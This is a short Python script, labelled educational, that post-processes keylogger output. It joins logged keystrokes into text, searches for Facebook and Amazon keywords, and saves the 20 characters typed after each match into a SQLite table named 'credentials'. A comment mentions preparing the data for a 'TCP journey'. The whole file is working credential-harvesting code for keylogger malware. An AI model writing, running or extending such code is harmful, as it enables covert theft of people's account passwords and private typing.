
# Data formatting for Educational Keylogger output
# By: Mike Brinkman 
# Purpose: Keylogger returns data as one character (Keydown event) per line.  We want words to show up horizontally, separated by spaces.  

import re
import sqlite3

# Initial formatting on our raw keylogger output in preparation for TCP journey.

# Each time the user presses a key, it is a separate KeyDown event - the hook program records each event on its own line
# then inputs a carriage return.  This is hard to read, and impossible to CTRL-F, so we format it horizontally here.
    
# The blank space character has been altered to '`' because of problems with .join eliminating spaces.
# Of course, if someone had '`' in a password, it would be an inconvenience. 
file = ['`' if letter == '' else letter for letter in open('keylog_formatted.txt').read().split('\n')]

the_string = ''
for i in file:
	the_string+=i

# Search for keywords and print whether they are found. 
key1 = ['facebook', 'Facebook', 'fbook', 'face', 'Face']
key2 = ['amazon', 'Amazon', 'amaz']
key_list = [key1, key2]

conn = sqlite3.connect('auths.db')
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS credentials (keyword text, rough_creds text)")

rough_credentials = '' # String containing the 20 characters following a detected keyword (likely contains auth info)
sub_found = 0 # Starting index of keyword if found 

print('[*] Searching for keywords ...')
for i in key_list:
	for k in i:
		sub_found = the_string.find(k)
		if (sub_found != -1):
			print('"{0}" found in log output!'.format(k))
			for inst in re.finditer(k, the_string):
				rough_credentials = the_string[inst.end():inst.end() + 20] # Store keyword & following 20 char to database table.
				c.execute("INSERT INTO credentials VALUES (?, ?)", (k, rough_credentials))
